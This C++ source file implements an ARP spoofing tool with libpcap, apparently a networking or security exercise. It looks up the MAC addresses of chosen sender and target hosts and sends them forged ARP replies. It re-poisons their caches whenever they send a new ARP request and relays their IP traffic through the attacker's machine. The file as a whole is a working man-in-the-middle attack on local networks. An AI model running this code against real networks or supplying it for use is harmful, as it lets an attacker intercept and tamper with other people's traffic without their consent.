#include "network_service.h"


namespace spoof {


NetworkService* NetworkService::instance = nullptr;


NetworkService::NetworkService(void)
{

}

NetworkService::~NetworkService(void)
{
    for (u_int32_t i = 0; i < cnt; i++) {
        free(sd_mac[i]);
        free(tg_mac[i]);
        sd_mac[i] = nullptr;
        tg_mac[i] = nullptr;
    }

    free(sd_ip);
    free(tg_ip);
    free(sd_mac);
    free(tg_mac);
    free(my_mac);
    free(bc_mac);
    free(uk_mac);

    sd_ip = tg_ip = nullptr;
    sd_mac = tg_mac = nullptr;
    my_mac = bc_mac = uk_mac = nullptr;

    destoryInstance();
}

void NetworkService::init(u_int32_t cnt)
{
    this->cnt = cnt;
    my_ip = 0;
    my_mac = nullptr;

    sd_ip = reinterpret_cast<u_int32_t*>(malloc(sizeof(u_int32_t) * cnt));
    tg_ip = reinterpret_cast<u_int32_t*>(malloc(sizeof(u_int32_t) * cnt));

    sd_mac = reinterpret_cast<u_int8_t**>(malloc(sizeof(u_int8_t*) * cnt));
    tg_mac = reinterpret_cast<u_int8_t**>(malloc(sizeof(u_int8_t*) * cnt));

    for (u_int32_t i = 0; i < cnt; i++) {
        sd_ip[i] = tg_ip[i] = 0;
        sd_mac[i] = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));
        tg_mac[i] = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));
    }

    my_mac = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));
    bc_mac = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));
    uk_mac = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));

    for (u_int32_t i = 0; i < ETHER_ADDR_LEN; i++) {
        bc_mac[i] = 0xFF;
        uk_mac[i] = 0x00;
    }

}



pcap_t *NetworkService::openPcap(const char* if_name) {
    char err_buf[PCAP_ERRBUF_SIZE] = {0};
    pcap_t *fp = pcap_open_live(if_name, BUFSIZ, 0, 0, err_buf);

    return fp;
}


int32_t NetworkService::requestArp(pcap_t *pt, u_int32_t src_ip, u_int32_t dst_ip, u_int8_t *dst_mac)
{
    u_int8_t *packet = packet_manager.buildARP(
                bc_mac,
                my_mac,
                ARPOP_REQUEST,
                my_mac,
                src_ip,
                dst_mac,
                dst_ip);

    if (pcap_sendpacket(pt, packet, static_cast<int>(Ethernet::length() + Arp::length())) != 0) {
        puts("Failed to send arp");
        return 1;
    }

    free(packet);

    return 0;
}

int32_t NetworkService::receiveArp(pcap_t *pt, u_int32_t sd_ip, u_int8_t *rv_mac)
{
    pcap_pkthdr *header;
    const u_int8_t *packet;

    int cnt = 10;

    while (cnt--) {

        int res = pcap_next_ex(pt, &header, &packet);
        if(res >= -2 && res <= 0) {
            return 1;
        }

        u_int32_t h_type = packet_manager.getEtherType(packet);

        if(h_type == ETHERTYPE_ARP) {

            if(packet_manager.getArpSenderIp(packet) == sd_ip) {
                packet_manager.getArpSenderMac(packet, rv_mac);

                printf("Received ARP from %d.%d.%d.%d (%02x:%02x:%02x:%02x:%02x:%02x)\n",
                       sd_ip << 24 >> 24,
                       sd_ip << 16 >> 24,
                       sd_ip << 8 >> 24,
                       sd_ip >> 24,
                       rv_mac[0], rv_mac[1], rv_mac[2], rv_mac[3], rv_mac[4], rv_mac[5]);
                return 0;
            }
        }
    }

    return 1;
}

int32_t NetworkService::sendSpoofingArp(pcap_t *pt, u_int32_t sd_ip, u_int8_t *sd_mac, u_int32_t tg_ip)
{
    u_int8_t *dst_mac = sd_mac;
    u_int8_t *src_mac = my_mac;
    u_int16_t op_code = ARPOP_REPLY;
    u_int8_t *sender_mac = my_mac;
    u_int32_t sender_ip = tg_ip;
    u_int8_t *target_mac = sd_mac;
    u_int32_t target_ip = sd_ip;

    u_int8_t* packet = packet_manager.buildARP(
                dst_mac,
                src_mac,
                op_code,
                sender_mac,
                sender_ip,
                target_mac,
                target_ip);

    int tmp = 5;
    while(tmp--) {
        pcap_sendpacket(pt, packet, static_cast<int>(Ethernet::length() + Arp::length()));
    }

    return 0;
}



int32_t NetworkService::relayPacket(pcap_t *pt)
{
    pcap_pkthdr *header;
    const u_int8_t *packet;

    while (1) {
        int res = pcap_next_ex(pt, &header, &packet);
        if (res >= -2 && res <= 0) {
            return 1;
        }
        u_int32_t h_type = packet_manager.getEtherType(packet);

        if (h_type == ETHERTYPE_ARP) {
            for (u_int32_t i = 0; i < this->cnt; i++) {
                if (packet_manager.isArpRequest(packet, tg_ip[i]) == true) {
                    sendSpoofingArp(pt, this->sd_ip[i], this->sd_mac[i], this->tg_ip[i]);
                    puts("Reply ARP!");
                    continue;
                }
            }
        } else if (h_type == ETHERTYPE_IP) {
            for (u_int32_t i = 0; i < this->cnt; i++) {

                u_int8_t *rl_packet = packet_manager.makeRelayPacket(packet, header->caplen, my_mac, tg_mac[i]);
                if (pcap_sendpacket(pt, rl_packet, static_cast<int>(header->caplen)) != 0) {
                    puts("Failed to send arp");
                    return 1;
                }

                free(rl_packet);
                continue;
            }
        }
    }

    return 0;
}



int32_t NetworkService::spoofArp(const char *if_name, int ip_cnt, char **sd_ip, char **tg_ip)
{
    init(static_cast<u_int32_t>(ip_cnt));

    pcap_t *pt = openPcap(if_name);
    this->my_ip = getMyIp(if_name);

    if (getInterfaceMac(if_name, my_mac) != 0) {
        return 1;
    }

    cnt = static_cast<u_int32_t>(ip_cnt);

    puts("Request ARP");

    for (u_int32_t i = 0; i < cnt; i++) {
        this->sd_ip[i] = inet_addr(sd_ip[i]);
        this->tg_ip[i] = inet_addr(tg_ip[i]);

        /* Get sender mac */
        if(getMac(pt, this->my_ip, this->sd_mac[i], this->sd_ip[i]) != 0)
            return 1;

        /* Get target mac */
        if(getMac(pt, this->my_ip, this->tg_mac[i], this->tg_ip[i]) != 0)
            return 1;
    }

    /* Send spoofing ARP */
    puts("Send spoofing packet");
    for (u_int32_t i = 0; i < cnt; i++) {
        sendSpoofingArp(pt, this->sd_ip[i], this->sd_mac[i], this->tg_ip[i]);
    }

    /* Relay */
    puts("Relay Start");
    relayPacket(pt);

    return 0;
}


int32_t NetworkService::getMac(pcap_t *pt, u_int32_t src_ip, u_int8_t *dst_mac, u_int32_t dst_ip)
{
    if (requestArp(pt, src_ip, dst_ip, dst_mac) != 0)
        return 1;

    if (receiveArp(pt, dst_ip, dst_mac) != 0)
        return 1;

    return 0;
}

int32_t NetworkService::getInterfaceMac(const char *if_name, u_int8_t *mac) {
    struct ifreq ifr;
    int fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_ifru.ifru_addr.sa_family = AF_INET;

    strncpy(reinterpret_cast<char*>(ifr.ifr_ifrn.ifrn_name), if_name, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);

    u_int8_t* temp_mac = reinterpret_cast<u_int8_t*>(ifr.ifr_ifru.ifru_hwaddr.sa_data);
    memcpy(mac, temp_mac, ETHER_ADDR_LEN);

    return 0;
}

u_int32_t NetworkService::getMyIp(const char *if_name) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, if_name, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    u_int32_t ip = (reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr))->sin_addr.s_addr;
    return ip;
}


}

